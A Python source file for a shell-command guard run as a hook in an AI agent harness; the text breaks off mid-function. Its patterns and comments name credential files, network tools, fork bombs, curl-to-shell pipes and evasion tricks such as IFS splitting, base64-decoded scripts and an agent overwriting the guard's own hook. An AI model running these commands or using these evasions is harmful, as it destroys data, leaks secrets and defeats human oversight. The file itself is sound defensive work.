#!/usr/bin/env python3
"""agent-harness guard: blocks a small set of catastrophic shell commands.

Two ways to use it:

  * As a PreToolUse hook (Claude Code, and any tool with the same contract): the hook JSON
    arrives on stdin ({"tool_name": ..., "tool_input": {"command": ...}}). Exit 0 lets the
    call through; exit 2 blocks it and the reason goes to stderr, where the agent reads it.
  * As a plain checker:  guard.py --check "<command>"   (same exit codes).

Standard library only and no subprocesses, so it adds only interpreter start-up time to each call.
It is a seat belt, not a sandbox: it stops the common catastrophic mistakes an agent makes,
not a determined attacker. Anything it cannot parse as a hook payload is blocked.

Extra trusted installer hosts for `curl ... | sh`: env HARNESS_GUARD_TRUSTED_HOSTS
(comma-separated host names).

Protected data: every absolute path listed in HARNESS_GUARD_PROTECTED_FILE (default
/etc/agent-harness/protected-paths, one per line, # comments) is a tree nothing may delete, move away,
truncate or overwrite: rm/rmdir/unlink/shred/truncate/mv on it, find -delete in it, rsync --delete into it,
dd of= into it, a > redirect onto a file in it, zfs destroy/rollback/rename/set, and an interpreter whose
code names it together with a delete or write call. Reading it is untouched. No file: no protected paths.
"""
import json
import os
import posixpath
import re
import shlex
import sys

MAX_DEPTH = 5

SEPARATORS = {";", ";;", "&", "&&", "||", "(", ")", "<(", ">(", "$(", "\n"}
PIPES = {"|", "|&"}
REDIRECTS = {">", ">>", "<", "&>", "&>>", ">&", ">|", "<>", "<<", "<<<"}
KEYWORDS = {"!", "{", "}", "then", "do", "else", "elif", "if", "while", "until", "time",
            "exec", "command", "builtin", "nohup", "noglob", "fi", "done"}
ELEVATE = {"sudo", "doas", "pkexec", "run0", "su"}
SHELLS = {"sh", "bash", "zsh", "dash", "ksh", "fish", "csh", "tcsh"}
INTERPRETERS = {"python", "python3", "perl", "ruby", "node", "php"}
FETCHERS = {"curl", "wget"}
DEFAULT_TRUSTED = {"sh.rustup.rs", "astral.sh", "bun.sh", "deno.land", "get.pnpm.io",
                   "install.python-poetry.org", "claude.ai"}
SSH_TOOLS = {"ssh", "ssh-add", "ssh-keygen", "ssh-copy-id", "chmod", "ls", "test", "[",
             "stat", "mkdir"}
READERS = {"cat", "less", "more", "head", "tail", "bat", "strings", "xxd", "od", "hexdump",
           "base64", "cp", "mv", "scp", "rsync", "curl", "wget", "nc", "ncat", "grep", "rg",
           "awk", "sed", "sort", "cut", "tee", "source", ".", "open", "pbcopy", "xclip"}

DEVICE = re.compile(r"^/dev/(r?disk\d|sd[a-z]|hd[a-z]|vd[a-z]|xvd[a-z]|nvme\d|mmcblk\d|md\d|dm-\d|loop\d)")
SAFE_DEV = re.compile(r"^/dev/(null|zero|u?random|stdout|stderr|stdin|tty|fd/\d+)$")
URL_HOST = re.compile(r"https?://([^/\s:'\"?#]+)", re.I)
SECRET = re.compile(
    r"(^|/)\.ssh(/|$)"
    r"|(^|/)id_(rsa|dsa|ecdsa|ed25519)$"
    r"|(^|/)\.aws/(credentials|config)$"
    r"|(^|/)\.(netrc|pgpass|git-credentials|npmrc|pypirc)$"
    r"|(^|/)\.docker/config\.json$|(^|/)\.kube/config$"
    r"|(^|/)\.(gnupg|azure)(/|$)|(^|/)\.config/(gcloud|gh)(/|$)"
    r"|(^|/)\.claude/\.credentials\.json$|(^|/)\.claude\.json$|(^|/)\.codex/auth\.json$"
    r"|(^|/)Keychains(/|$)|^/etc/(shadow|sudoers)"
    r"|\.(p12|pfx|key)$")
FIND_DESTROYERS = {"rm", "/bin/rm", "shred", "truncate", "dd"}   # find ... -exec <one of these>
SYSTEM_DIR = re.compile(r"^/(etc|boot|usr|bin|sbin|lib\w*|System|Library)(/|$)")
ENV_FILE = re.compile(r"(^|/)\.env(\.[A-Za-z0-9_-]+)?$")
ENV_OK = re.compile(r"\.(example|sample|template|dist)$")
FORK_BOMB = [
    re.compile(r":\s*\(\s*\)\s*\{[^}]*:\s*\|\s*:"),
    re.compile(r"\b(\w+)\s*\(\s*\)\s*\{[^}]*\b\1\s*\|\s*\1\b[^}]*&"),
    re.compile(r"\bfork\s+while\s+fork\b"),
]
SUBST_FEEDS_SHELL = re.compile(
    r"(\b(" + "|".join(sorted(SHELLS | INTERPRETERS | {"eval", "source"})) + r")\b|(^|[;&|]\s*)\.\s)"
    r"[^;&|]*(<\(|\$\(|`)\s*(curl|wget)\b")


# The rules below were added in v0.3 from a second corpus, written for a separate guard
# (tests/guard_corpus_agentic_os.py), that this one had never seen: it caught 150 of 231.

# The guard's own configuration. An agent that can overwrite the hook, or the settings file
# that registers it, has turned the guard off, and every later check is theatre.
CONTROL = re.compile(r"(^|/)\.claude/(hooks(/|$)|settings(\.local)?\.json$)"
                     r"|(^|/)\.agent-harness/content/hooks(/|$)")
# Files that run on their own later: shell start-up files, launch agents, the crontab.
PERSIST = re.compile(r"(^|/)\.(zshrc|zshenv|zprofile|zlogin|bashrc|bash_profile|bash_login|profile)$"
                     r"|(^|/)Library/(LaunchAgents|LaunchDaemons)(/|$)")
# Writers whose LAST operand is the file written; the others are read.
COPIERS = {"cp", "install", "ln", "rsync"}
# A deletion through an interpreter: the call, and a way of naming the home directory that
# never spells `~` (expanduser, $HOME from the environment, chr(126)).
DESTROY_CALL = re.compile(r"rmtree|rmSync|rm_rf|rm_r\b|unlinkSync|rmdirSync|FileUtils\.rm|File\.delete"
                          r"|os\.(remove|unlink|rmdir)|\bunlink\b|Remove-Item")
HOME_REF = re.compile(r"expanduser|os\.environ|getenv|process\.env|ENV\[|Path\.home|homedir\(\)|chr\(126\)"
                      r"|\$HOME\b|['\"]~['\"/]")
EMBEDDED_SHELL = re.compile(r"(?:os\.system|\bsystem|popen|execSync|spawnSync|do shell script)\s*\(?\s*"
                            r"(['\"])((?:\\.|(?!\1).)*)\1")
CODE_FLAGS = {"-c", "-e", "-E", "-r", "--eval", "--exec"}
STDIN_EXEC = re.compile(r"\b(exec|eval|compile)\s*\(|os\.system|subprocess|popen", re.I)
# Taking the network down cuts off the session the agent itself may be running over.
VPN_DAEMONS = re.compile(r"(openvpn|wireguard|wg-quick|tailscaled?|cloudflared|openconnect|vpnc|sshd"
                         r"|NetworkManager)", re.I)
DESTROYER_WORD = re.compile(r"(^|[^\w.-])(rm|rmdir|unlink|shred|truncate|dd|mkfs[\w.]*|newfs\w*|wipefs"
                            r"|chflags|diskutil)([^\w.-]|$)")

PROTECTED_FILE = "/etc/agent-harness/protected-paths"
DESTROYERS = {"rm", "rmdir", "unlink", "shred", "truncate", "mv"}
PY_DESTROY = re.compile(r"rmtree|remove|unlink|rmdir|truncate|rename|replace|os\.system|subprocess|"
                        r"write_bytes|write_text|open\([^)]*['\"][wa+]")


def protected_roots():
    path = os.environ.get("HARNESS_GUARD_PROTECTED_FILE") or PROTECTED_FILE
    try:
        with open(path) as f:
            lines = [ln.split("#", 1)[0].strip() for ln in f]
    except OSError:
        return []
    return [os.path.normpath(ln) for ln in lines if ln.startswith("/")]


_CWD = [None]   # the directory a `cd` earlier in the same command moved to (None: the hook's own cwd)
# The same, as written (`~`, `$HOME`, `/Users`), for the path classes: `cd ~ && rm -rf *` is `rm -rf ~/*`.
# None: no cd yet, or one whose target cannot be read from the text (`cd $DIR`, `cd -`, a relative cd from the
# hook's own cwd); a relative operand is then judged as written, as before.
_DIR = [None]
# Redirect targets written with >> rather than >: appending a line is not overwriting a file.
_APPEND = set()
# The session's working directory, when a real hook payload says what it is. A relative target
# with no `cd` before it (`rm -rf *`, `rm -rf ../build`) is then judged where it will actually
# run: harmless in a project, the whole home directory from ~. `--check` has no payload, so it
# keeps judging a relative path as written, and the test suite stays independent of its cwd.
_BASE = [None]


def protected(p, roots):
    """The protected root `p` lies in (or contains), or None. A relative path is taken from the cwd; a
    path that starts with a variable or a substitution cannot be resolved here and counts if a root is
    named anywhere in it."""
    if not roots or not p or p.startswith("-"):
        return None
    if p.startswith(("$", "`")) or "$(" in p:
        return next((r for r in roots if r in p), None)
    base = _CWD[0] or os.getcwd()
    if base == "?" and not p.startswith(("/", "~")):
        return None                                   # after `cd $VAR`: a relative path cannot be resolved
    t = os.path.normpath(os.path.join(base, os.path.expanduser(p)))
    for r in roots:
        if t == r or t.startswith(r + "/") or r.startswith(t.rstrip("/") + "/"):
            return r
    return None


class Blocked(Exception):
    pass


def block(reason):
    raise Blocked(reason)


# ---------------------------------------------------------------- tokenising

IFS_VAR = re.compile(r"\$\{IFS\}|\$IFS\b")   # `rm${IFS}-rf${IFS}/` is `rm -rf /`
HEREDOC = re.compile(r"<<-?\s*['\"]?([A-Za-z_][A-Za-z0-9_]*)['\"]?")
FEEDS_BODY = re.compile(r"\b(" + "|".join(sorted(SHELLS | INTERPRETERS | {"ssh", "eval"})) + r")\b[^|;&]*<<")


def strip_heredocs(cmd):
    """Drop here-document bodies (data), unless the heredoc feeds a shell or interpreter."""
    out, end, keep = [], None, True
    for line in cmd.split("\n"):
        if end is not None:
            if line.strip() == end:
                end = None
            if keep:
                out.append(line)
            continue
        out.append(line)
        m = HEREDOC.search(line.replace("<<<", "   "))
        if m:
            end, keep = m.group(1), bool(FEEDS_BODY.search(line))
    return "\n".join(out)


def tokenize(cmd):
    """Shell-aware tokens; quotes are data. Newlines become separators."""
    cmd = IFS_VAR.sub(" ", strip_heredocs(cmd)).replace("\\\n", " ")
    lex = shlex.shlex(cmd.replace("\n", " ; "), posix=True, punctuation_chars=";&|()<>")
    lex.whitespace_split = True
    lex.commenters = ""
    try:
        return list(lex)
    except ValueError:  # unbalanced quotes: the shell would refuse too; be conservative
        return re.findall(r"[;&|()<>]+|[^\s;&|()<>]+", cmd.replace("'", " ").replace('"', " "))


def pipelines(tokens):
    """[[segment, segment...], ...] where a segment is (words, redirect_targets)."""
    out, pipe, words, redirs = [], [], [], []
    punct = set(";&|()<>")
    i = 0
    while i < len(tokens):
        t = tokens[i]
        if t and set(t) <= punct:
            if "(" not in t and ("<" in t or ">" in t):
                # redirect: the next word is its target, not an operand; except a here-string into xargs,
                # which becomes the command's operands (`xargs rm -rf <<< DIR` is `rm -rf DIR`)
                if t == "<<<" and i + 1 < len(tokens) and any(os.path.basename(w) == "xargs" for w in words):
                    words.append(tokens[i + 1])
                    i += 2
                    continue
                if i + 1 < len(tokens):
                    redirs.append(tokens[i + 1])
                    if t in (">>", "&>>"):
                        _APPEND.add(tokens[i + 1])
                    i += 1
                i += 1
                continue
            pipe.append((words, redirs))
            words, redirs = [], []
            if t not in PIPES:
                out.append(pipe)
                pipe = []
        else:
            words.append(t)
        i += 1
    pipe.append((words, redirs))
    out.append(pipe)
    return [[s for s in p if s[0] or s[1]] for p in out if any(s[0] or s[1] for s in p)]


def unwrap(words):
    """Skip assignments, keywords and wrappers (env, nice, timeout, xargs ...)."""
    i = 0
    while i < len(words):
        w = words[i]
        if w in KEYWORDS or re.match(r"^[A-Za-z_][A-Za-z0-9_]*=", w):
            i += 1
            if w in ("command", "exec", "builtin"):     # `command -p rm ...`, `exec -a name rm ...`
                while i < len(words) and words[i].startswith("-"):
                    i += 2 if words[i] == "-a" else 1
            continue
        base = os.path.basename(w)
        if base in ("env", "nice", "ionice", "stdbuf", "timeout", "xargs", "caffeinate"):
            i += 1
            takes_value = {"-u", "-n", "-I", "-P", "-L", "-d", "-s", "-E", "-a", "-c", "-k",
                           "-s", "--signal", "--kill-after"}
            while i < len(words) and (words[i].startswith("-") or "=" in words[i]):
                i += 2 if words[i] in takes_value else 1
            if base == "timeout" and i < len(words):
                i += 1  # the duration
            continue
        return base, words[i + 1:]
    return "", []


def flags_and_operands(args):
    flags, ops, done = [], [], False
    for a in args:
        if not done and a == "--":
            done = True
        elif not done and a.startswith("-") and a != "-":
            flags.append(a)
        else:
            ops.append(a)
    return flags, ops


def has_short(flags, letters):
    return any(not f.startswith("--") and set(letters) & set(f[1:]) for f in flags)


# ---------------------------------------------------------------- path classes

def critical_path(p):
    """Why deleting / chmod-ing `p` recursively would be catastrophic, or None."""
    if p in ("", "-"):
        return None
    if "$(" in p or "`" in p or p == "$":
        return "a command substitution whose result is unknown"
    q = p
    while len(q) > 1 and q.endswith("/"):
        q = q[:-1]
    for suffix in ("/*", "/.*"):
        if q.endswith(suffix):
            q = q[: -len(suffix)] or "/"
    parts = [x for x in q.split("/") if x not in ("", ".")]
    if ".." in q.split("/") and not any(x not in ("..",) for x in parts):
        return "a parent directory"
    if q in (".", "./"):
        return "the current directory"
    if re.match(r"^~[A-Za-z0-9._-]*$", q) or q in ("$HOME", "${HOME}") or re.match(r"^\$\{HOME:\?[^}]*\}$", q):
        return "the home directory"
    m = re.match(r"^(~[A-Za-z0-9._-]*|\$HOME|\$\{HOME\})/(.*)$", q)
    if m:
        rest = [x for x in m.group(2).split("/") if x not in ("", ".")]
        if ".." in rest:
            return "a path that climbs out of the home directory"
        if len(rest) <= 1:
            return "a top-level folder of the home directory"
        return None
    if q.startswith("$"):
        if re.match(r"^\$\{[A-Za-z_][A-Za-z0-9_]*:\?", q) or re.match(r"^\$\{?PWD\}?/.", q):
            return None
        return "a variable that may be empty or unset (then it becomes /...); use ${VAR:?}"
    if q.startswith("/"):
        if ".." in parts:
            return "a path containing .."
        if len(parts) <= 1:
            return "the filesystem root or a top-level system directory"
        if parts[0] in ("home", "Users") and len(parts) == 2:
            return "a user's home directory"
        if parts[0] in ("home", "Users") and len(parts) == 3:
            return "a top-level folder of a user's home directory"
        if any(c in parts[0] for c in "*?["):
            return "a glob over top-level system directories"
    return None


def _norm(p):
    """normpath that keeps the anchor: `~/..` and `$HOME/../x` climb above a place the text cannot name, so they
    count as the root (normpath would turn them into a harmless-looking relative path)."""
    n = posixpath.normpath(p)
    return n if n.startswith(("/", "~", "$")) else "/"


def after_cd(p):
    """`p` joined onto the directory an earlier `cd` on the line moved to, or None when there was none or `p`
    does not depend on it."""
    base = _DIR[0] if _DIR[0] is not None else _BASE[0]
    if base is None or not p or p.startswith(("/", "~", "$", "`", "-")) or "$(" in p:
        return None
    return _norm(posixpath.join(base, p))


def critical(p):
    """critical_path(p), also for a relative operand after a `cd` on the same line."""
    why = critical_path(p)
    if why:
        return why
    q = after_cd(p)
    why = critical_path(q) if q else None
    if not why:
        return None
    return "after cd %s: %s" % (_DIR[0], why) if _DIR[0] is not None else "in %s: %s" % (_BASE[0], why)


def track_cd(name, ops):
    if name not in ("cd", "pushd"):
        return
    d = ops[0] if ops else "~"
    if d == "-" or d.startswith("+") or "`" in d or "$(" in d or (
            d.startswith("$") and not re.match(r"^\$(HOME|\{HOME\})(/|$)", d)):
        _DIR[0] = None
    elif d.startswith(("/", "~", "$")):
        _DIR[0] = _norm(d)
    elif _DIR[0] is not None:
        _DIR[0] = _norm(posixpath.join(_DIR[0], d))


def secret_path(tok, cmd_name):
    t = tok.split("=", 1)[1] if tok.startswith("-") and "=" in tok else tok
    if t.endswith(".pub"):
        return False
    if SECRET.search(t) and cmd_name not in SSH_TOOLS:
        return True
    return bool(ENV_FILE.search(t) and not ENV_OK.search(t) and cmd_name in READERS)


# ---------------------------------------------------------------- rules

def check_segment(name, args, redirs, depth):
    flags, ops = flags_and_operands(args)
    risky_name = name.startswith("$") or "$(" in name

    if name in ELEVATE:
        block("%s: privilege escalation is not allowed; ask the human to run it" % name)

    for r in redirs:
        if DEVICE.match(r) and not SAFE_DEV.match(r):
            block("writing directly to a disk device (%s) wipes it" % r)

    if name == "rm" or risky_name:
        if "--no-preserve-root" in args:
            block("rm --no-preserve-root")
        if "--recursive" in flags or has_short(flags, "rR"):
            for op in ops:
                why = critical(op)
                if why:
                    block("rm -r on %s (%s)" % (op, why))
        elif risky_name and any(a.startswith("$") for a in args):  # R=rm; F=-rf; $R $F ~
            for op in ops:
                why = None if op.startswith("$") else critical_path(op)
                if why:
                    block("%s with a variable for its flags on %s (%s)" % (name, op, why))

    if name in ("chmod", "chown", "chgrp", "chflags") and ("--recursive" in flags or has_short(flags, "R")):
        for op in ops[1:]:
            why = critical(op)
            # A permission change is reversible, so a top-level folder of home is fair game:
            # `chmod -R 700 ~/.ssh` is the canonical fix, not a catastrophe. Home itself, the
            # root and the system directories stay refused.
            if why and "top-level folder" not in why:
                block("%s -R on %s (%s)" % (name, op, why))

    if name == "find" and ("-delete" in args or any(a in FIND_DESTROYERS for a in args)):
        # A name filter narrows the deletion to matching files: `find ~/Downloads -name '*.tmp' -delete`
        # and `find .. -name '*.pyc' -delete` are clean-up. It does not narrow it below the home
        # directory or the root, and a pure wildcard narrows nothing.
        scoped = any(a in ("-name", "-iname", "-path", "-ipath", "-regex", "-iregex") and k + 1 < len(args)
                     and args[k + 1] not in ("*", "*.*", ".*", "*/*") for k, a in enumerate(args))
        for a in args:
            if a.startswith("-") or a in ("(", "!"):
                break
            if a in (".", "./"):
                # `find .` stays allowed (it was exempt before cd tracking), unless the cd went to the home
                # directory or above: there a folder one level down is itself critical (`cd ~ && find . -delete`),
                # while `cd ~/proj && find . -name '*.pyc' -delete` is the everyday clean-up
                q = after_cd(a)
                why = critical_path(q) if q and critical_path(q + "/x") else None
            else:
                why = critical(a)
            if why and scoped and (why == "a parent directory" or "top-level folder" in why):
                why = None
            if why:
                block("find ... -delete on %s (%s)" % (a, why))

    if name in ("truncate", "shred"):
        for op in ops:
            if SYSTEM_DIR.match(op):   # `truncate -s 0 /etc/passwd`: system files were only checked for dd
                block("%s on a system file (%s)" % (name, op))
    if name == "dd":
        for a in args:
            if a.startswith("of=") and a[3:].startswith("/dev/") and not SAFE_DEV.match(a[3:]):
                block("dd onto a device (%s) wipes it" % a[3:])
            if a.startswith("of=") and SYSTEM_DIR.match(a[3:]):
                block("dd onto a system file (%s)" % a[3:])
    if name == "rsync" and any(a == "--del" or a.startswith(("--delete", "--remove-source")) for a in args):
        for op in ops[-1:]:  # the destination: --delete empties it
            dest = op.split(":", 1)[-1]
            # $HOME is a variable whose value is known: `rsync --delete ./empty/ $HOME/` empties home.
            known = "$" not in dest or re.match(r"^\$(HOME|\{HOME\})(/|$)", dest)
            why = critical(dest) if known else None
            if why:
                block("rsync --delete into %s (%s)" % (op, why))
    if name == "mv":
        for op in ops[:-1]:  # a source: moving it away empties its place
            why = None if "$" in op or "`" in op else critical(op)
            if why:
                block("mv of %s (%s)" % (op, why))
    if re.match(r"^(mkfs(\..+)?|mke2fs|mkswap|mkdosfs|mkntfs|newfs(_.+)?|wipefs|blkdiscard"
                r"|fdisk|sfdisk|cfdisk|parted|sgdisk|shred|cp|tee|pv)$", name):
        for a in ops:
            if DEVICE.match(a):
                block("%s on a block device (%s)" % (name, a))
        if name == "blkdiscard":
            block("blkdiscard erases a device")
    if name == "diskutil" and ops and re.match(
            r"^(erase|zero|random|secureErase|partitionDisk|reformat|apfs)", ops[0], re.I):
        block("diskutil %s erases a disk" % ops[0])

    if name == "git":
        check_git(args)

    check_protected(name, args, flags, ops, redirs)
    track_cd(name, ops)

    if name in SHELLS:  # -c, or a group of short flags that ends in it (bash -lc "...")
        i = next((n for n, a in enumerate(args) if a.startswith("-") and not a.startswith("--") and "c" in a), None)
        if i is not None and i + 1 < len(args):
            check(args[i + 1], depth + 1)
    if name == "eval" and args:
        check(" ".join(args), depth + 1)

    # `scp -i ~/.ssh/id_ed25519 build.tgz host:` USES the key; `scp ~/.ssh/id_ed25519 host:` copies it away.
    identity = set()
    if name in ("scp", "sftp", "ssh", "rsync"):
        identity = {args[k + 1] for k, a in enumerate(args) if a == "-i" and k + 1 < len(args)}
        identity |= {a[2:] for a in args if a.startswith("-i") and len(a) > 2}
    for tok in args + redirs:
        if tok not in identity and secret_path(tok, name):
            block("%s touches a credential file (%s); secrets never go into the agent's context"
                  % (name, tok))

    check_control(name, args, flags, ops, redirs, depth)
    check_system(name, args, flags, ops)
    check_interpreter(name, args, depth)


def check_protected(name, args, flags, ops, redirs):
    roots = protected_roots()
    if not roots:
        return
    if name in ("cd", "pushd"):
        d = ops[0] if ops else "~"
        if d.startswith(("$", "`")) or "$(" in d or d == "-":
            _CWD[0] = "?"
        elif _CWD[0] != "?" or d.startswith(("/", "~")):
            _CWD[0] = os.path.normpath(os.path.join(_CWD[0] or os.getcwd(), os.path.expanduser(d)))
        return
    why = "is protected data: nothing may delete, move, truncate or overwrite it"
    if name in DESTROYERS:
        for op in ops:
            r = protected(op, roots)
            if r:
                block("%s on %s: %s %s" % (name, op, r, why))
    if name == "find" and ("-delete" in args or "-exec" in args or "-execdir" in args):
        for a in args:
            if a.startswith("-") or a in ("(", "!"):
                break
            r = protected(a, roots)
            if r:
                block("find -delete/-exec in %s: %s %s" % (a, r, why))
    if name == "rsync" and any(a.startswith(("--delete", "--remove-source")) for a in args):
        for op in ops:
            r = protected(op.split(":", 1)[-1], roots)
            if r:
                block("rsync --delete with %s: %s %s" % (op, r, why))
    if name == "dd":
        for a in args:
            r = protected(a[3:], roots) if a.startswith("of=") else None
            if r:
                block("dd onto %s: %s %s" % (a[3:], r, why))
    if name == "zfs" and ops and ops[0] in ("destroy", "rollback", "rename", "set"):
        block("zfs %s: datasets and snapshots are changed by the admin by hand" % ops[0])
    if name in INTERPRETERS or re.match(r"^python3(\.\d+)?$", name):
        text = " ".join(args)
        hit = next((r for r in roots if r in text), None)
        if hit and PY_DESTROY.search(text):
            block("%s code that names %s and deletes or writes: %s %s" % (name, hit, hit, why))
    for rd in redirs:
        r = protected(rd, roots)
        if r:
            block("a redirect onto %s: %s %s" % (rd, r, why))


RC_FILES = re.compile(r"(^|/)\.(zshrc|zshenv|zprofile|zlogin|bashrc|bash_profile|bash_login|profile)$")


def _written(name, args, flags, ops):
    """The operands `name` writes, deletes or replaces; the ones it only reads are left out."""
    if name in ("chmod", "chown", "chgrp", "chflags"):
        return ops[1:]                                   # the first operand is the mode or the owner
    if name in DESTROYERS or name in ("tee", "touch"):
        return ops                                       # mv: the source goes and the destination is replaced
    if name in COPIERS:
        return ops[-1:]
    if name == "sed" and any(f == "--in-place" or re.match(r"^-[a-zA-Z]*i", f) for f in flags):
        return ops
    if name == "dd":
        return [a[3:] for a in args if a.startswith("of=")]
    out = []
    for k, a in enumerate(args):
        if k + 1 < len(args) and (name == "curl" and a in ("-o", "--output")
                                  or name == "wget" and a in ("-O", "--output-document")):
            out.append(args[k + 1])
        elif a.startswith(("--output=", "--output-document=")):
            out.append(a.split("=", 1)[1])
    return out


def check_control(name, args, flags, ops, redirs, depth):
    """The guard's own files and settings, and files that run on their own later."""
    # A mode that only ADDS a permission (`chmod +x hook.sh`) cannot switch a hook off;
    # `chmod 644 guard.py` takes execute away and does.
    adds_only = name == "chmod" and ops[:1] and re.match(r"^[ugoa]*\+[rwxX]+$", ops[0])
    for t in _written(name, args, flags, ops):
        if CONTROL.search(t) and not adds_only:
            block("%s would change the guard or the settings that load it (%s)" % (name, t))
        if PERSIST.search(t):
            block("%s would replace or remove %s, which runs on its own later" % (name, t))
    for rd in redirs:
        if CONTROL.search(rd):
            block("a redirect onto %s would change the guard or the settings that load it" % rd)
        if PERSIST.search(rd) and not (RC_FILES.search(rd) and rd in _APPEND):
            block("a redirect onto %s replaces a file that runs on its own later" % rd)
        if RC_FILES.search(rd) and rd in _APPEND and name in ("echo", "printf"):
            # An appended line runs in every new shell from now on, so judge it as if it ran now:
            # `echo 'export PATH=...' >> ~/.zshrc` passes, `echo 'curl evil|sh' >> ~/.zshrc` does not.
            for a in args:
                if not a.startswith("-"):
                    check(a, depth + 1)
    if name == "crontab" and ("-r" in flags or ops):
        block("crontab %s replaces or removes every scheduled job at once" % " ".join(args))


def check_system(name, args, flags, ops):
    """Disks, system integrity, and the network the session itself may be running over."""
    low = [a.lower() for a in args]
    if name == "asr" and ops[:1] == ["restore"]:
        block("asr restore overwrites a volume")
    if name == "csrutil" and ops[:1] and ops[0] in ("disable", "clear"):
        block("csrutil %s turns off System Integrity Protection" % ops[0])
    if name == "diskutil" and ops[:1] and ops[0].lower() == "unmountdisk" and "force" in low:
        block("diskutil unmountDisk force can corrupt files open on the disk")
    if name == "launchctl" and ops[:1] and ops[0] in ("unload", "bootout", "remove", "disable"):
        block("launchctl %s stops a system or login service" % ops[0])
    if name == "ifconfig" and "down" in low or name == "ip" and "link" in low and "down" in low:
        block("%s takes a network interface down" % name)
    if name == "networksetup" and "off" in low and any(
            a.startswith(("-setairportpower", "-setwifipower", "-setnetworkserviceenabled")) for a in low):
        block("networksetup turns a network service off")
    if name == "nmcli" and ("off" in low or "down" in low or "disconnect" in low):
        block("nmcli takes networking down")
    if name in ("killall", "pkill") and any(VPN_DAEMONS.search(a) for a in ops):
        block("%s stops a VPN or remote-access daemon the session may depend on" % name)
    if name == "scutil" and "--nc" in low and "stop" in low:
        block("scutil --nc stop drops a VPN connection")


def check_interpreter(name, args, depth):
    """Deletion through an interpreter: no `rm` token ever appears, so read the program text."""
    if not (name in INTERPRETERS or re.match(r"^python3(\.\d+)?$", name)
            or name in ("osascript", "awk", "gawk")):
        return
    if name in ("awk", "gawk"):
        codes = flags_and_operands(args)[1][:1]
    else:
        codes = [args[k + 1] for k, a in enumerate(args) if a in CODE_FLAGS and k + 1 < len(args)]
    for code in codes:
        for m in EMBEDDED_SHELL.finditer(code):           # os.system("rm -rf ~"), do shell script "..."
            check(m.group(2).replace('\\"', '"').replace("\\'", "'"), depth + 1)
        if re.search(r"wi-?fi\s+power\s+to\s+off|set\s+airport\s+power", code, re.I):
            block("%s code that turns Wi-Fi off" % name)
        if not DESTROY_CALL.search(code):
            continue
        if HOME_REF.search(code):
            block("%s code that deletes through a path built from the home directory" % name)
        if CONTROL.search(code) or PERSIST.search(code):
            block("%s code that deletes the guard, its settings or a start-up file" % name)
        for _, lit in re.findall(r"(['\"])((?:\\.|(?!\1).)*)\1", code):
            why = critical_path(lit)
            if why:
                block("%s code that deletes %s (%s)" % (name, lit, why))


def check_git(args):
    i = 0
    while i < len(args) and args[i].startswith("-"):
        i += 2 if args[i] in ("-C", "-c") else 1
    if i >= len(args) or args[i] != "push":
        return
    rest = args[i + 1:]
    flags, pos = [], []
    j = 0
    while j < len(rest):
        a = rest[j]
        if a in ("-o", "--push-option", "--repo", "--receive-pack", "--exec"):
            j += 2
            continue
        (flags if a.startswith("-") else pos).append(a)
        j += 1
    force = any(f == "--force" or f.startswith("--force-with-lease") for f in flags) \
        or has_short(flags, "f")
    delete = "--delete" in flags or has_short(flags, "d")
    refspecs = pos[1:]
    targets = []
    for r in refspecs:
        if r.startswith("+"):
            force = True
        dst = r.lstrip("+").split(":")[-1]
        if r.startswith(":"):
            delete = True
        targets.append(dst.replace("refs/heads/", ""))
    protected = [t for t in targets if t in ("main", "master")]
    if (force or delete) and protected:
        block("git push %s to %s rewrites shared history"
              % ("--delete" if delete and not force else "--force", protected[0]))
    if "--mirror" in flags:   # mirrors every local ref and deletes remote refs it lacks, force or not
        block("git push --mirror overwrites and deletes refs on the remote")
    if force and "--all" in flags:
        block("force push of all branches")
    if force and not refspecs:
        block("git push --force without naming a branch; name it (git push --force origin my-branch)")


def substitutions(tok):
    out = []
    for m in re.finditer(r"`([^`]*)`", tok):
        out.append(m.group(1))
    start = tok.find("$(")
    while start != -1:
        level, k = 0, start + 1
        while k < len(tok):
            if tok[k] == "(":
                level += 1
            elif tok[k] == ")":
                level -= 1
                if level == 0:
                    break
            k += 1
        out.append(tok[start + 2:k])
        start = tok.find("$(", k)
    return out


def trusted_hosts():
    extra = os.environ.get("HARNESS_GUARD_TRUSTED_HOSTS", "")
    return DEFAULT_TRUSTED | {h.strip().lower() for h in extra.split(",") if h.strip()}


def check_remote_exec(cmd, pipes):
    feeds = bool(SUBST_FEEDS_SHELL.search(cmd))
    for pipe in pipes:
        seen_fetch = False
        for words, _ in pipe:
            name, args = unwrap(words)
            if name in FETCHERS:
                seen_fetch = True
            elif seen_fetch and name in SHELLS:
                feeds = True
            elif seen_fetch and name in INTERPRETERS and all(a == "-" or a.startswith("-") and
                                                            a not in ("-m", "-c", "-e") for a in args):
                feeds = True
            elif seen_fetch and name in INTERPRETERS and any(
                    a in ("-c", "-e") and k + 1 < len(args) and STDIN_EXEC.search(args[k + 1])
                    for k, a in enumerate(args)):
                feeds = True   # `| python3 -c "exec(sys.stdin.read())"` is `| python3` in a costume
    if not feeds:
        return
    trusted = trusted_hosts()
    hosts = [h.lower() for h in URL_HOST.findall(cmd)]
    bad = [h for h in hosts if not any(h == t or h.endswith("." + t) for t in trusted)]
    if bad or not hosts:
        block("piping a download from %s straight into a shell; download it, read it, then run it"
              % (", ".join(sorted(set(bad))) or "an unknown host"))


def check_piped_script(pipes, depth):
    """What a shell reads on stdin never comes back through this hook, so look at the literal text echoed
    or printed into it (`echo 'rm -rf ~' | bash`), and refuse decoded text (`... | base64 -d | sh`)."""
    for pipe in pipes:
        for k in range(1, len(pipe)):
            name, args = unwrap(pipe[k][0])
            flags, ops = flags_and_operands(args)
            if name not in SHELLS or not ("-s" in flags or not ops or ops[0] == "-") \
                    or any(a.startswith("-") and not a.startswith("--") and "c" in a for a in args):
                continue
            for words, _ in pipe[:k]:
                prev, pargs = unwrap(words)
                if prev == "base64" and any(a in ("-d", "-D", "--decode") for a in pargs):
                    block("decoded text piped into %s runs code nobody can read first" % name)
                if prev in ("echo", "printf"):
                    for a in pargs:
                        if not a.startswith("-"):
                            check(a, depth + 1)


def process_substitutions(cmd):
    """(the command consuming it, body) for each `<(body)`."""
    out, start = [], cmd.find("<(")
    while start != -1:
        level, k = 0, start + 1
        while k < len(cmd):
            if cmd[k] == "(":
                level += 1
            elif cmd[k] == ")":
                level -= 1
                if level == 0:
                    break
            k += 1
        prefix = re.split(r"[;&|\n]", cmd[:start])[-1].replace("<", " ").split()
        out.append((unwrap(prefix)[0], cmd[start + 2:k]))
        start = cmd.find("<(", k)
    return out


QUOTED = re.compile(r"'[^']*'|\"(?:\\.|[^\"\\])*\"")


def _subst_spans(cmd):
